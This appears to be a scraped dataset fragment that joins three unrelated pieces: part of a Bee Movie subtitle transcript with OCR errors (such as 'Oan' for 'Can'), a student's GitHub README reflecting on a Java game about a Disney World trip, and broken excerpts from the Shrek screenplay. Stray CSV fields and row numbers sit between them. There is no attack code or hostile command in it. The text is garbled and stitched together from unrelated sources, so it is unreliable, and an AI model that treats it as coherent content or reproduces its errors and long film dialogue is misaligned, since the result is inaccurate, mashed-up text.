gotta do is get what they\'ve got back here with what we\'ve got.     - Bees. - Park.     - Pollen! - Flowers.     - Repollination! - Across the nation!     Tournament of Roses, Pasadena, Oalifornia.     They\'ve got nothing but flowers, floats and cotton candy.     Security will be tight.     I have an idea.     Vanessa Bloome, FTD.     Official floral business. It\'s real.     Sorry, ma\'am. Nice brooch.     Thank you. It was a gift.     Once inside, we just pick the right float.     How about The Princess and the Pea?     I could be the princess, and you could be the pea!     Yes, I got it.     - Where should I sit? - What are you?     - I believe I\'m the pea. - The pea?     It goes under the mattresses.     - Not in this fairy tale, sweetheart. - I\'m getting the marshal.     You do that! This whole parade is a fiasco!     Let\'s see what this baby\'ll do.     Hey, what are you doing?!     Then all we do is blend in with traffic...     ...without arousing suspicion.     Once at the airport, there\'s no stopping us.     Stop! Security.     - You and your insect pack your float? - Yes.     Has it been in your possession the entire time?     Would you remove your shoes?     - Remove your stinger. - It\'s part of me.     I know. Just having some fun. Enjoy your flight.     Then if we\'re lucky, we\'ll have just enough pollen to do the job.     Oan you believe how lucky we are? We have just enough pollen to do the job!     I think this is gonna work.     It\'s got to work.     Attention, passengers, this is Oaptain Scott.     We have a bit of bad weather in New York.     It looks like we\'ll experience a couple hours delay.     Barry, these are cut flowers with no water. They\'ll never make it.     I gotta get up there and talk to them.     Be careful.     Oan I get help with the Sky Mall magazine?     I\'d like to order the talking inflatable nose and ear hair trimmer.     Oaptain, I\'m in a real situation.     - What\'d you say, Hal? - Nothing.     Bee!     Don\'t freak out! My entire species...     What are you doing?     - Wait a minute! I\'m an attorney! - Who\'s an attorney?     Don\'t move.     Oh, Barry.     Good afternoon, passengers. This is your captain.     Would a Miss Vanessa Bloome in 24B please report to the cockpit?     And please hurry!     What happened here?     There was a DustBuster, a toupee, a life raft exploded.     One\'s bald, one\'s in a boat, they\'re both unconscious!     - Is that another bee joke? - No!     No one\'s flying the plane!     This is JFK control tower, Flight 356. What\'s your status?     This is Vanessa Bloome. I\'m a florist from New York.     Where\'s the pilot?     He\'s unconscious, and so is the copilot.     Not good. Does anyone onboard have flight experience?     As a matter of fact, there is.     - Who\'s that? - Barry Benson.     From the honey trial?! Oh, great.     Vanessa, this is nothing more than a big metal bee.     It\'s got giant wings, huge engines.     I can\'t fly a plane.     - Why not? Isn\'t John Travolta a pilot? - Yes.     How hard could it be?     Wait, Barry! We\'re headed into some lightning.     This is Bob Bumble. We have some late-breaking news from JFK Airport,     where a suspenseful scene is developing.     Barry Benson, fresh from his legal victory...     That\'s Barry!     ...is attempting to land a plane, loaded with people, flowers     and an incapacitated flight crew.     Flowers?!     We have a storm in the area and two individuals at the controls     with absolutely no flight experience.     Just a minute. There\'s a bee on that plane.     I\'m quite familiar with Mr. Benson and his no-account compadres.     They\'ve done enough damage.     But isn\'t he your only hope?     Technically, a bee shouldn\'t be able to fly at all.     Their wings are too small...     Haven\'t we heard this a million times?     ""The surface area of the wings and body mass make no sense.""     - Get this on the air! - Got it.     - Stand by. - We\'re going live.     The way we work may be a mystery to you.     Making honey takes a lot of bees doing a lot of small jobs.     But let me tell you about a small job.     If you do it well, it makes a big difference.     More than we realized. To us, to everyone.     That\'s why I want to get bees back to working together.     That\'s the bee way! We\'re not made of Jell-O.     We get behind a fellow.     - Black and yellow! - Hello!     Left, right, down, hover.     - Hover? - Forget hover.     This isn\'t so hard. Beep-beep! Beep-beep!     Barry, what happened?!     Wait, I think we were on autopilot the whole time.     - That may have been helping me. - And now we\'re not!     So it turns out I cannot fly a plane.     All of you, let\'s get behind this fellow! Move it out!     Move out!     Our only chance is if I do what I\'d do, you copy me with the wings of the plane!     Don\'t have to yell.     I\'m not yelling! We\'re in a lot of trouble.     It\'s very hard to concentrate with that panicky tone in your voice!     It\'s not a tone. I\'m panicking!     I can\'t do this!     Vanessa, pull yourself together. You have to snap out of it!     You snap out of it.     You snap out of it.     - You snap out of it! - You snap out of it!     - You snap out of it! - You snap out of it!     - You snap out of it! - You snap out of it!     - Hold it! - Why? Oome on, it\'s my turn.     How is the plane flying?     I don\'t know.     Hello?     Benson, got any flowers for a happy occasion in there?     The Pollen Jocks!     They do get behind a fellow.     - Black and yellow. - Hello.     All right, let\'s drop this tin can on the blacktop.     Where? I can\'t see anything. Oan you?     No, nothing. It\'s all cloudy.     Oome on. You got to think bee, Barry.     - Thinking bee. - Thinking bee.     Thinking bee! Thinking bee! Thinking bee!     Wait a minute. I think I\'m feeling something.     - What? - I don\'t know. It\'s strong, pulling me.     Like a 27-million-year-old instinct.     Bring the nose down.     Thinking bee! Thinking bee! Thinking bee!     - What in the world is on the tarmac? - Get some lights on that!     Thinking bee! Thinking bee! Thinking bee!     - Vanessa, aim for the flower. - OK.     Out the engines. We\'re going in on bee power. Ready, boys?     Affirmative!     Good. Good. Easy, now. That\'s it.     Land on that flower!     Ready? Full reverse!     Spin it around!     - Not that flower! The other one! - Which one?     - That flower. - I\'m aiming at the flower!     That\'s a fat guy in a flowered shirt. I mean the giant pulsating flower     made of millions of bees!     Pull forward. Nose down. Tail up.     Rotate around it.     - This is insane, Barry! - This\'s the only way I know how to fly.     Am I koo-koo-kachoo, or is this plane flying in an insect-like pattern?     Get your nose in there. Don\'t be afraid. Smell it. Full reverse!     Just drop it. Be a part of it.     Aim for the center!     Now drop it in! Drop it in, woman!     Oome on, already.     Barry, we did it! You taught me how to fly!     - Yes. No high-five! - Right.     Barry, it worked! Did you see the giant flower?     What giant flower? Where? Of course I saw the flower! That was genius!     - Thank you. - But we\'re not done yet.     Listen, everyone!     This runway is covered with the last pollen     from the last flowers available anywhere on Earth.     That means this is our last chance.     We\'re the only ones who make honey, pollinate flowers and dress like this.     If we\'re gonna survive as a species, this is our moment! What do you say?     Are we going to be bees, orjust Museum of Natural History keychains?     We\'re bees!     Keychain!     Then follow me! Except Keychain.     Hold on, Barry. Here.     You\'ve earned this.     Yeah!     I\'m a Pollen Jock! And it\'s a perfect fit. All I gotta do are the sleeves.     Oh, yeah.     That\'s our Barry.     Mom! The bees are back!     If anybody needs to make a call, now\'s the time.     I got a feeling we\'ll be working late tonight!     Here\'s your change. Have a great afternoon! Oan I help who\'s next?     Would you like some honey with that? It is bee-approved. Don\'t forget these.     Milk, cream, cheese, it\'s all me. And I don\'t see a nickel!     Sometimes I just feel like a piece of meat!     I had no idea.     Barry, I\'m sorry. Have you got a moment?     Would you excuse me? My mosquito associate will help you.     Sorry I\'m late.     He\'s a lawyer too?     I was already a blood-sucking parasite. All I needed was a briefcase.     Have a great afternoon!     Barry, I just got this huge tulip order, and I can\'t get them anywhere.     No problem, Vannie. Just leave it to me.     You\'re a lifesaver, Barry. Oan I help who\'s next?     All right, scramble, jocks! It\'s time to fly.     Thank you, Barry!     That bee is living my life!     Let it go, Kenny.     - When will this nightmare end?! - Let it all go.     - Beautiful day to fly. - Sure is.     Between you and me, I was dying to get out of that office.     You have got to start thinking bee, my friend.     - Thinking bee! - Me?     Hold it. Let\'s just stop for a second. Hold it.     I\'m sorry. I\'m sorry, everyone. Oan we stop here?     I\'m not making a major life decision during a production number!     All right. Take ten, everybody. Wrap it up, guys.     I had virtually no rehearsal for that.  Special thanks to SergeiK.",,22

159,https://github.com/qixuanHou/Mapping-My-Break.git,"Please Read Me First. This is a set of java file of my final version of electronic artifacts. This is a game to map my experience in Disney World, in Orlando during this spring break.   However, because of my limited skills in computer science, I really have no idea how to simplify the process to run the game. Sorry for the inconvenience.   In order to run the game, you may need to install JAVA. I hope the following links will help you. \xa0\xa0 \xa0http://www.oracle.com/technetwork/java/javase/downloads/index-jsp-138363.html#javasejdk\u2028\xa0\xa0 \xa0http://www.cc.gatech.edu/~simpkins/teaching/gatech/cs1331/guides/install-java.html  My main file is called Disney. You can call Disney in console to start the game. However, I failed to putting all the things inside Disney file. Therefore, you may also need to call AdventureLand, MainStreet, and FrontierLand to start other three games.   I hope this will help you. Sorry again for the inconvenience.     1. the structure of my project   My project only focused on my trip in Magic Kingdom, one part of Disney world in Orlando. It is a game which guides players to choose from six sub-games, which match six sections of the park, Main Street U.S.A, Tomorrowland, Adventureland, Frontierland, Fantasyland and Liberty Square. I chose one of the rides I took in each section which, from my perspective, shows what I found interesting in Disney world. I changed what I experienced in the park into a small computer game. I want to share my experience with others while they play my games. In the following part of self reflection, I explain the background, rules and other things about each game. For convenience of matching them, I use different color to mark different parts. I hope it will help readers a little bit when they are lost in my disordered reflections.   1. the hall of presidents - Liberty Square   2. Festivall parade - Fantasyland (I explain this one in the part of technology skill limitations)   3. Big Thunder Mountain Railroad - Frontierland   4.talking with Woody- Adventureland    5. Stitch Store - Tomorrowland      6. lunch time - Main Street USA      3. my reflection of the trip in Disney World  from dream to reality    When I exited Disney resort, I found a sign along the street welcomed people back to real world. Actually, when I was in Orlando, I couldn\'t believe as an adult, people can mess up fantasy world in the theme parks and the real world. Nevertheless, I felt I was still in fantasy world, when I dreamed twice that I fought for the key to open the door of future. As is known to all, while sleeping, people always dream about what people thinks in the daytime. Therefore, my dream shows that my mind still stayed in the world with Mickey and Donald.    I believe that it is experiencing fantasy world which is the source of the greatest happiness people get from theme park. On the one hand, everybody has pressure in real life especially for adults. They can get out of pressure for a day trip in theme park. They can experience different lives here with cartoon characters. On the other hand, sometimes, it is a really hard task to fulfill some dreams, such as being a princess. However, in Disney world, you can dress up the same as Snow White, waiting for your prince; you can go to space by rocket; you can also travel all over the world in one day and enjoy the food of each country. These are all the magic of theme parks.    Therefore, in my game, I learnt the way which Disney design their rides to focus on the background story of the game instead of the game itself. For example, there is a ride called Big Thunder Mountain Railroad, which streaks through a haunted gold-mining town aboard a rollicking runaway mine train. The views around the ride were like a gold mining town. There were tools for gold-mining around the railroad and the railroad looked like very old. In order to show riders that it was a haunted gold-mining town, the train always took a sudden turn or speed up quickly to scare people.    I decided to name one of my game, which was inspired by this ride, the same name, Big Thunder Mountain Railroad. Instead of sitting inside the mine train to travel around the haunted town, mine was for users to use keyboard to control the train to travel around the gridding railroad. I place traps inside several parts of gridding to ""scare"" players, who cannot know where traps are until they get into them. If I know how to use animation, I will show scary pictures when players drive their train to the traps. Unlike the ride in Disney, my players can no longer travel once they encounter a trap because their train may have some problems to keep moving. Also, the main goal in the game is to find the gold. However, as we know, finding gold is really hard. Therefore, players must go to find Aladdin\'s Wonderful lamp where also places inside the gridding while players cannot see its exact place until they happen to drive inside the part where lamp is. Aladdin\'s Wonderful lamp will show players the map of the gold and when people get to the gold mine, they win. However, there is another limitation of the game. Haunted town is so dangerous during the night. Therefore, players only have 12 hours to finish the task. Train can drive one square in 20 min. Therefore, train can only move 36 times or they will also be caught by traps.    In this game, I want to show audiences I have a background story like rides in Disney World. Players need to find the gold in a haunted gold-mining town. Also, in order to show the relationship with Disney, I use Aladdin\'s Wonderful Lamp as the guide for the players, which is a well known characters in Disney cartoon.    I created another game, called talking with Woody to show the magic power of Disney characters. There are a lot of chances to meet Disney characters in Disney world. On the one hand, travelers, especially small kids, are really excited to meet the characters they watched on TV. I think some kids may believe they take pictures with real Mickey Mouse. On the hand, staffs in Disney who wear the costumes are really tired. It was hot in Orlando last week, but all costumes were very heavy. I was moved by the staffs inside Mickey. They also need to mimic the actions of characters and also need to show kindness and warmness to children. It seems like a really hard job. Therefore, I decide to show this part of Disney in my project as well. I decided to use Woody, a toy all the toys look up to. He is smart, kind and brave like a cowboy should be. He is more than a top, he is friend to everyone enjoying the movie Toy. In order to create an interactive game, I planned to ask players to guide Woody. Players need to call Woody before their instructions. For instance, if players say (actually players are typing) ""Woody, please sit down"", Woody will sit down (actually, there will be another line on the screen showing the same as players import). However, if players are rude and just say ""sit down"" without calling Woody, Woody won\'t act (actually there is just nothing showing up on the screen).  great facilities to provide convenience to everyone   The facilities to satisfy needs for special groups of people, like small kids or disabled people, are well developed. In the past in China, it seemed impossible for parents to take infants and small kids to travel. The road is not flat or wide enough for strollers or wheelchairs. However, in Disney world, everything seemed like well prepared for everyone to use.   There are strollers rentals, and electric conveyance vehicles rentals, which are available to rent throughout Disney world. There are baby care center for mothers to feed, change and nurse little ones. There are locker rentals for storing personal items. There are also hearing disability services which have sign language interpretation to help disabled people to enjoy fantasy world. There are still a lot other convenient services in Disney world. I think the purpose of these services show the pursue of equality among everyone in the world. On the one hand, I am really touched by the availability of these services here. It seems Disney try its best to service everyone who have desire to experience fantasy land. On the other hand, in this way, Disney can attract more travelers in order to make more money in some ways.    Also, in Disney, it seems like a tradition that there are stores at the exit of the famous rides. Somebody may think it is just a strategy to make people shopping a lot. However, I think it also provides some convenience that travelers can buy souvenirs where is memorable. For example, when I finished my trip in Escape Stitch, I entered a store with a lot of kinds of Stitch, like Stitch pillow, Stitch key chain and so on. I really want to buy something in order to remind me the wonderful feelings. Therefore, I showed my opinion inside my game as well. I wrote one part is for shopping. The items are different kinds of Stitch. My codes can act as a robot to help customers to shop in the store.    There are a lot of restaurants in Disney. Maps of Disney are full of restaurants\' name. The greatest things about the food are in Epcot, I experienced different counties in one day. I felt like I was in fast travel in different parts of the world and tasted their special food and snacks while I was on the way. I remembered I was still eating Japanese food when I was in ""Mexico"". It was a great experience. However, there were always a long waiting lines for the all restaurants. People needed to reserve a table a day before their trip and even they had the reservation, they still needed to wait for a long time. I think Disney may need some good ways to fix the problems of waiting for a long time. I have no idea of changing the situation of restaurants, but I think if there are robots to customers to order in fast food restaurant, it may help a lot. Thus, I have another code to customers to order in Plaza Restaurant. If this kind of robots can work in the real life, people can order by themselves and there will be more staffs available to prepare food.    theme park uses interesting ways to teach knowledge of boring topics   Theme part is also a great source of learning knowledge, especially for kids. They use Disney characters, interesting shows, or even games to teach useful things. The ways change the boring knowledge to interesting things, which always attract children\'s attention.    The most amazing one was an interactive game in Epcot\'s Innoventions, called ""where\'s the fire?"", which teaches adults and children basic fire safety in a fun and entertaining way. About every five minutes, the players waiting in line are divided into two groups and move into the home\'s entry. Here, a host will explain the object of the game and lay out the rules. The scenario is this: you are on a mission to discover a number of fire hazards commonly found around the house. To do this, you move from room to room, looking for potential risks. To help in the task, each player is given a special ""safely light"" to help uncover lurking dangers. The rooms are large projection screens. When a hazard is discovered, all persons in the room must shine their safety light on the same spot. when they do, the hazard is rendered harmless and points are assigned. After playing in the game to find the hazardous things in the house, I learned a lot of safety tips. It is much easier to remember the tips I learned during the game than those I learned on textbook or internet. I believe kids will enjoy the games and learn from them as well.    I also tried to show this reflection in my project. Thus, I planned to make a game, called the hall of presidents, which test people\'s knowledge of presidents in USA. However, I failed to achieve the goal of making it an entertaining game instead of a quiz. My game was still like a quiz. However, because it is the only code which can work well inside my big game. I decide to still hold the game for my projects in order to what my original ideas are.   4. technology skill limitations    I feel terribly sorry for my limited skills in CS. It is my first time to learn JAVA this semester. I just begin to learn the core concepts of JAVA this month. When I choose to use java code for this project, I know I will face plentiful limitations and problems. Here I want to express my gratitude to Dr. Johnson, who encouraged me not to give up my ideas.   To be honest, I have no idea of how to change a java code into a real game with animations. I know the background story of the game is more important for English course and pictures are the best way to show the background, but I have no idea to show all these things by JAVA coding. Therefore, I choose to use videos for my presentation. In this way, I can show my animation inside the videos while the code clue of my game is still composed by JAVA coding. Also, video gives me a lot of freedom when choose my contents for presentation. I can explain a lot details of my project clearly through videos.    For example, I found the festival parade in the magic kingdom was great and I wanted to share the experience in my project by showing the pictures or videos. However, because of the technology limitations, I can only show the videos in my presentations. Also, I mistakenly deleted my videos which I shot on my trip Orlando, I can only share others\' parade show......   Also, I want to apologize for the incompleteness of my game. I only dedicated to writing codes for Magic Kingdom, a part of my trip during spring break. Writing codes is a really time consuming task for me. In general, I need to spend more than eight hours to finish one project for my CS assignment this semester. While for this project, the final artifacts are composed of several parts of codes and in the end I need to write the father code in order to take care of my code family for spring break. Due to my limitation in writing codes, I can only finish one part of Disney world. However, I think my code shows all my reflections and perspectives during my trip, even though it looks like it only shows one part of my trip.    The terrible mistake I made is that I found out the most of my codes I wrote had significant errors on Tuesday. I went to CS TA office for help, while the errors were still impossible to fix in order to achieve the goal I planned to get. Consequently, my game have to be separated into several parts. Instead of a big game having others as sub-games inside the big one, my final artifacts are composed by several small games. I need to start them one by one. It may cause some inconvenience for players to map their trip in Disney world.",,10

She was locked away in a castle guarded                           by a terrible fire-breathing dragon.

One                 of her legs flies out and kicks Tinkerbell out of Peter Pan\'s                 hands, and her cage drops on Donkey\'s head. He gets sprinkled                 with fairy dust and he\'s able to fly.                                        DONKEY                          Hey! I can fly!

(the pixie dust begins                           to wear off) Uh-oh. (he begins to sink                           to the ground.)

Donkey keeps running and he eventually runs into Shrek. Literally.                 Shrek turns around to see who bumped into him. Donkey looks scared                 for a moment then he spots the guards coming up the path. He                 quickly hides behind Shrek.                                        HEAD GUARD                          You there. Ogre!                                       SHREK                          Aye?                                       HEAD GUARD                          By the order of Lord Farquaad I am authorized                           to place you both under arrest and transport                           you to a designated resettlement facility.                                                                  SHREK                          Oh, really? You and what army?                 He looks behind the guard and the guard turns to look as well                 and we see that the other men have run off. The guard tucks tail                 and runs off. Shrek laughs and goes back about his business and                 begins walking back to his cottage.                                        DONKEY                          Can I say something to you? Listen,                           you was really, really, really somethin\'                           back here. Incredible!                                        SHREK                          Are you talkin\' to...(he turns around                           and Donkey is gone) me? (he turns back                           around and Donkey is right in front                           of him.) Whoa!                                        DONKEY                          Yes. I was talkin\' to you. Can I tell                           you that you that you was great back                           here? Those guards! They thought they                           was all of that. Then you showed up,                           and bam! They was trippin\' over themselves                           like babes in the woods. That really                           made me feel good to see that.                                        SHREK                          Oh, that\'s great. Really.                                       DONKEY                          Man, it\'s good to be free.                                       SHREK                          Now, why don\'t you go celebrate your                           freedom with your own friends? Hmm?                                                                  DONKEY                          But, uh, I don\'t have any friends. And                           I\'m not goin\' out there by myself. Hey,                           wait a minute! I got a great idea! I\'ll                           stick with you. You\'re mean, green,                           fightin\' machine. Together we\'ll scare                           the spit out of anybody that crosses                           us.                  Shrek turns and regards Donkey for a moment before roaring very                 loudly.                                        DONKEY                          Oh, wow! That was really scary. If you                           don\'t mind me sayin\', if that don\'t                           work, your breath certainly will get                           the job done, \'cause you definitely                           need some Tic Tacs or something, \'cause                           you breath stinks! You almost burned                           the hair outta my nose, just like the                           time...(Shrek covers his mouth but Donkey                           continues to talk, so Shrek removes                           his hand.) ...then I ate some rotten                           berries. I had strong gases leaking                           out of my butt that day.                                        SHREK                          Why are you following me?                                       DONKEY                          I\'ll tell you why. (singing) \'Cause                           I\'m all alone, There\'s no one here beside                           me, My problems have all gone, There\'s                           no one to deride me, But you gotta have                           faith...                                        SHREK                          Stop singing! It\'s no wonder you don\'t                           have any friends.                                        DONKEY                          Wow. Only a true friend would be that                           cruelly honest.                                        SHREK                          Listen, little donkey. Take a look at                           me. What am I?                                        DONKEY                          (looks all the way up at Shrek) Uh ...really                           tall?                                        SHREK                          No! I\'m an ogre! You know. ""Grab your                           torch and pitchforks."" Doesn\'t that                           bother you?                                        DONKEY                          Nope.                                       SHREK                          Really?                                       DONKEY                          Really, really.                                       SHREK                          Oh.                                       DONKEY                          Man, I like you. What\'s you name?                                       SHREK                          Uh, Shrek.                                       DONKEY                          Shrek? Well, you know what I like about                           you, Shrek? You got that kind of I-don\'t-care-what-nobody-thinks-of-me                           thing. I like that. I respect that,                           Shrek. You all right. (They come over                           a hill and you can see Shrek\'s cottage.)                           Whoa! Look at that. Who\'d want to live                           in place like that?                                        SHREK                          That would be my home.                                       DONKEY                          Oh! And it is lovely! Just beautiful.                           You know you are quite a decorator.                           It\'s amazing what you\'ve done with such                           a modest budget. I like that boulder.                           That is a nice boulder. I guess you                           don\'t entertain much, do you?                                        SHREK                          I like my privacy.                                       DONKEY                          You know, I do too. That\'s another thing                           we have in common. Like I hate it when                           you got somebody in your face. You\'ve                           trying to give them a hint, and they                           won\'t leave. There\'s that awkward silence.                           (awkward silence) Can I stay with you?                                                                  SHREK                          Uh, what?                                       DONKEY                          Can I stay with you, please?                                       SHREK                          (sarcastically) Of course!                                       DONKEY                          Really?                                       SHREK                          No.                                       DONKEY                          Please! I don\'t wanna go back there!                           You don\'t know what it\'s like to be                           considered a freak. (pause while he                           looks at Shrek) Well, maybe you do.                           But that\'s why we gotta stick together.                           You gotta let me stay! Please! Please!                                                                  SHREK                          Okay! Okay! But one night only.                                       DONKEY                          Ah! Thank you! (he runs inside the cottage)                                                                  SHREK                          What are you...? (Donkey hops up onto                           a chair.) No! No!                                        DONKEY                          This is gonna be fun! We can stay up                           late, swappin\' manly stories, and in                           the mornin\' I\'m makin\' waffles.                                        SHREK                          Oh!                                       DONKEY                          Where do, uh, I sleep?                                       SHREK                          (irritated) Outside!                                       DONKEY                          Oh, well, I guess that\'s cool. I mean,                           I don\'t know you, and you don\'t know                           me, so I guess outside is best, you                           know. Here I go. Good night. (Shrek                           slams the door.) (sigh) I mean, I do                           like the outdoors. I\'m a donkey. I was                           born outside. I\'ll just be sitting by                           myself outside, I guess, you know. By                           myself, outside. I\'m all alone...there\'s                           no one here beside me...                  SHREK\'S COTTAGE - NIGHT                 Shrek is getting ready for dinner. He sits himself down and lights                 a candle made out of earwax. He begins to eat when he hears a                 noise. He stands up with a huff.                                        SHREK                          (to Donkey) I thought I told you to                           stay outside.                                        DONKEY                          (from the window) I am outside.                 There is another noise and Shrek turns to find the person that                 made the noise. He sees several shadows moving. He finally turns                 and spots 3 blind mice on his table.                                        BLIND MOUSE1                          Well, gents, it\'s a far cry from the                           farm, but what choice do we have?                                                                  BLIND MOUSE2                          It\'s not home, but it\'ll do just fine.                                                                  GORDO                          (bouncing on a slug) What a lovely bed.                                                                  SHREK                          Got ya. (Grabs a mouse, but it escapes                           and lands on his shoulder.)                                        GORDO                          I found some cheese. (bites Shrek\'s                           ear)                                        SHREK                          Ow!                                       GORDO                          Blah! Awful stuff.                                       BLIND MOUSE1                          Is that you, Gordo?                                       GORDO                          How did you know?                                       SHREK                          Enough! (he grabs the 3 mice) What are                           you doing in my house? (He gets bumped                           from behind and he drops the mice.)                           Hey! (he turns and sees the Seven Dwarves                           with Snow White on the table.) Oh, no,                           no, no. Dead broad off the table.                                                                  DWARF                          Where are we supposed to put her? The                           bed\'s taken.                                        SHREK                          Huh?                 Shrek marches over to the bedroom and throws back the curtain.                 The Big Bad Wolf is sitting in the bed. The wolf just looks at                 him.                                        BIG BAD WOLF                          What?                 TIME LAPSE                 Shrek now has the Big Bad Wolf by the collar and is dragging                 him to the front door.                                        SHREK                          I live in a swamp. I put up signs. I\'m                           a terrifying ogre! What do I have to                           do get a little privacy? (He opens the                           front door to throw the Wolf out and                           he sees that all the collected Fairy                           Tale Creatures are on his land.) Oh,                           no. No! No!                  The 3 bears sit around the fire, the pied piper is playing his                 pipe and the rats are all running to him, some elves are directing                 flight traffic so that the fairies and witches can land...etc.                                                        SHREK                          What are you doing in my swamp? (this                           echoes and everyone falls silent.)                                            Gasps are heard all around. The 3 good fairies hide inside a                 tent.                                        SHREK                          All right, get out of here. All of you,                           move it! Come on! Let\'s go! Hapaya!                           Hapaya! Hey! Quickly. Come on! (more                           dwarves run inside the house) No, no!                           No, no. Not there. Not there. (they                           shut the door on him) Oh! (turns to                           look at Donkey)                                        DONKEY                          Hey, don\'t look at me. I didn\'t invite                           them.                                        PINOCCHIO                          Oh, gosh, no one invited us.                                       SHREK                          What?                                       PINOCCHIO                          We were forced to come here.                                       SHREK                          (flabbergasted) By who?                                       LITTLE PIG                          Lord Farquaad. He huffed and he puffed                           and he...signed an eviction notice.                                                                  SHREK                          (heavy sigh) All right. Who knows where                           this Farquaad guy is?                  Everyone looks around at each other but no one answers.                                       DONKEY                          Oh, I do. I know where he is.                                       SHREK                          Does anyone else know where to find                           him? Anyone at all?                                        DONKEY                          Me!

Do not get comfortable.                           Your welcome is officially worn out.                           In fact, I\'m gonna see this guy Farquaad                           right now and get you all off my land                           and back where you came from! (Pause.                           Then the crowd goes wild.) Oh! (to Donkey)                           You! You\'re comin\' with me.                                        DONKEY                          All right, that\'s what I like to hear,                           man. Shrek and Donkey, two stalwart                           friends, off on a whirlwind big-city                           adventure. I love it!                                        DONKEY                          (singing) On the road again. Sing it                           with me, Shrek. I can\'t wait to get                           on the road again.                                        SHREK                          What did I say about singing?                                       DONKEY                          Can I whistle?                                       SHREK                          No.                                       DONKEY                          Can I hum it?                                       SHREK                          All right, hum it.                 Donkey begins to hum \'On the Road Again\'.                 DULOC - KITCHEN                 A masked man is torturing the Gingerbread Man. He\'s continually                 dunking him in a glass of milk. Lord Farquaad walks in.                                        FARQUAAD                          That\'s enough. He\'s ready to talk.                                            The Gingerbread Man is pulled out of the milk and slammed down                 onto a cookie sheet. Farquaad laughs as he walks over to the                 table. However when he reaches the table we see that it goes                 up to his eyes. He clears his throat and the table is lowered.                                                        FARQUAAD                          (he picks up the Gingerbread Man\'s legs                           and plays with them) Run, run, run,                           as fast as you can. You can\'t catch                           me. I\'m the gingerbread man.                                        GINGERBREAD MAN                          You are a monster.                                       FARQUAAD                          I\'m not the monster here. You are. You                           and the rest of that fairy tale trash,                           poisoning my perfect world. Now, tell                           me! Where are the others?                                        GINGERBREAD MAN                          Eat me! (He spits milk into Farquaad\'s                           eye.)                                        FARQUAAD                          I\'ve tried to be fair to you creatures.                           Now my patience has reached its end!                           Tell me or I\'ll...(he makes as if to                           pull off the Gingerbread Man\'s buttons)                                                                  GINGERBREAD MAN                          No, no, not the buttons. Not my gumdrop                           buttons.                                        FARQUAAD                          All right then. Who\'s hiding them?                                                                  GINGERBREAD MAN                          Okay, I\'ll tell you. Do you know the                           muffin man?                                        FARQUAAD                          The muffin man?                                       GINGERBREAD MAN                          The muffin man.                                       FARQUAAD                          Yes, I know the muffin man, who lives                           on Drury Lane?                                        GINGERBREAD MAN                          Well, she\'s married to the muffin man.

FARQUAAD                          She\'s married to the muffin man.                 The door opens and the Head Guard walks in.                                       HEAD GUARD                          My lord! We found it.                                       FARQUAAD                          Then what are you waiting for? Bring                           it in.                  More guards enter carrying something that is covered by a sheet.                 They hang up whatever it is and remove the sheet. It is the Magic                 Mirror.                                        GINGERBREAD MAN                          (in awe) Ohhhh...

(Farquaad picks                           him up and dumps him into a trash can                           with a lid.) No!                                        FARQUAAD                          Evening. Mirror, mirror on the wall.

MIRROR                          What I mean is you\'re not a king yet.                           But you can become one. All you have                           to do is marry a princess.                                        FARQUAAD                          Go on.

And here they are! Bachelorette number                           one is a mentally abused shut-in from                           a kingdom far, far away. She likes sushi                           and hot tubbing anytime. Her hobbies                           include cooking and cleaning for her                           two evil sisters.

Just kiss her dead, frozen lips and                           find out what a live wire she is. Come                           on. Give it up for Snow White!

But don\'t let that cool you off. She\'s                           a loaded pistol who likes pina colads                           and getting caught in the rain. Yours                           for the rescuing, Princess Fiona!

She\'s perfect. All I                           have to do is just find someone who                           can go...                                        MIRROR                          But I probably should mention the little                           thing that happens at night.                                        FARQUAAD                          I\'ll do it.                                       MIRROR                          Yes, but after sunset...                                       FARQUAAD                          Silence! I will make this Princess Fiona                           my queen, and DuLoc will finally have                           the perfect king! Captain, assemble                           your finest men. We\'re going to have                           a tournament. (smiles evilly)                  DuLoc Parking Lot - Lancelot Section                 Shrek and Donkey come out of the field that is right by the parking                 lot. The castle itself is about 40 stories high.                                        DONKEY                          But that\'s it. That\'s it right there.                           That\'s DuLoc. I told ya I\'d find it.                                                                  SHREK                          So, that must be Lord Farquaad\'s castle.                                                                  DONKEY                          Uh-huh. That\'s the place.                                       SHREK                          Do you think maybe he\'s compensating                           for something? (He laughs, but then                           groans as Donkey doesn\'t get the joke.                           He continues walking through the parking                           lot.)                                        DONKEY                          Hey, wait. Wait up, Shrek.                                       MAN                          Hurry, darling. We\'re late. Hurry.                                                                  SHREK                          Hey, you! (The attendant, who is wearing                           a giant head that looks like Lord Farquaad,                           screams and begins running through the                           rows of rope to get to the front gate                           to get away from Shrek.) Wait a second.                           Look, I\'m not gonna eat you. I just                           - - I just - - (He sighs and then begins                           walking straight through the rows. The                           attendant runs into a wall and falls                           down. Shrek and Donkey look at him then                           continue on into DuLoc.)                  DULOC                 They look around but all is quiet.                                       SHREK                          It\'s quiet. Too quiet. Where is everybody?                                                                  DONKEY                          Hey, look at this!                 Donkey runs over and pulls a lever that is attached to a box                 marked \'Information\'. The music winds up and then the box doors                 open up. There are little wooden people inside and they begin                 to sing.                                        WOODEN PEOPLE                          Welcome to DuLoc such a perfect town                                            Here we have some rules                 Let us lay them down                 Don\'t make waves, stay in line                 And we\'ll get along fine                 DuLoc is perfect place                 Please keep off of the grass                 Shine your shoes, wipe your... face                 DuLoc is, DuLoc is                 DuLoc is perfect place.                 Suddenly a camera takes Donkey and Shrek\'s picture.                                       DONKEY                          Wow! Let\'s do that again! (makes ready                           to run over and pull the lever again)                                                                  SHREK                          (grabs Donkey\'s tail and holds him still)                           No. No. No, no, no! No.                  They hear a trumpet fanfare and head over to the arena.                                       FARQUAAD                          Brave knights. You are the best and                           brightest in all the land. Today one                           of you shall prove himself...                  As Shrek and Donkey walk down the tunnel to get into the arena                 Donkey is humming the DuLoc theme song.                                        SHREK                          All right. You\'re going the right way                           for a smacked bottom.                                        DONKEY                          Sorry about that.                                       FARQUAAD                          That champion shall have the honor -                           - no, no - - the privilege to go forth                           and rescue the lovely Princess Fiona                           from the fiery keep of the dragon. If                           for any reason the winner is unsuccessful,                           the first runner-up will take his place                           and so on and so forth. Some of you                           may die, but it\'s a sacrifice I am willing                           to make. (cheers) Let the tournament                           begin! (He notices Shrek) Oh! What is                           that? It\'s hideous!                                        SHREK                          (turns to look at Donkey and then back                           at Farquaad) Ah, that\'s not very nice.                           It\'s just a donkey.                                        FARQUAAD                          Indeed. Knights, new plan! The one who                           kills the ogre will be named champion!                           Have it him!                                        MEN                          Get him!                                       SHREK                          Oh, hey! Now come on! Hang on now. (bumps                           into 